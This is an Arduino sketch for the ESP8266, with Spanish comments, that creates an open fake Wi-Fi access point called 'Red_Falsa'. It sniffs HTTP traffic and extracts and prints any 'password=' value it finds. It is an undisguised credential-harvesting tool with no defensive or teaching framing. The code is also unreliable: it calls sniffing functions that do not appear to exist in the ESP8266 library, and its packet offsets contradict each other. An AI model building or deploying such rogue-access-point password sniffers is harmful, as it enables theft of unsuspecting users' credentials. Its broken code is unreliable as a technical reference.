#include <ESP8266WiFi.h>

const char* ssid = "Red_Falsa";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  WiFi.setPhyMode(WIFI_PHY_MODE_11B);
  WiFi.setChannel(1);
  WiFi.macAddress();
  WiFi.printDiag(Serial);
  WiFi.sniff(true); // Activar el modo de escucha de paquetes
}

void loop() {
  uint8_t* packet = WiFi.getSnifferPacket();
  if (packet != NULL) {
    Serial.println("Paquete capturado:");
    Serial.print("Fuente: ");
    Serial.println(packet[12], HEX);
    Serial.print("Destino: ");
    Serial.println(packet[15], HEX);
    Serial.print("Protocolo: ");
    Serial.println(packet[23], HEX);
    Serial.print("Longitud: ");
    Serial.println(packet[24], HEX);
    // Analizar el paquete para extraer la contraseña
    if (packet[23] == 0x08 && packet[24] == 0x00) { // Paquete TCP
      uint16_t puertoFuente = (packet[20] << 8) | packet[21];
      uint16_t puertoDestino = (packet[22] << 8) | packet[23];
      if (puertoDestino == 80) { // Paquete HTTP
        uint8_t* datos = packet + 34;
        uint16_t longitudDatos = packet[24];
        Serial.print("Datos: ");
        for (uint16_t i = 0; i < longitudDatos; i++) {
          Serial.print(datos[i], HEX);
          Serial.print(" ");
        }
        Serial.println();
        // Extraer la contraseña de los datos
        String contraseña = "";
        for (uint16_t i = 0; i < longitudDatos; i++) {
          if (datos[i] == 'p' && datos[i + 1] == 'a' && datos[i + 2] == 's' && datos[i + 3] == 's' && datos[i + 4] == 'w' && datos[i + 5] == 'o' && datos[i + 6] == 'r' && datos[i + 7] == 'd' && datos[i + 8] == '=') {
            i += 9;
            while (i < longitudDatos && datos[i] != '&') {
              contraseña += (char)datos[i];
              i++;
            }
            break;
          }
        }
        Serial.print("Contraseña: ");
        Serial.println(contraseña);
      }
    }
  }
  delay(1000);
}
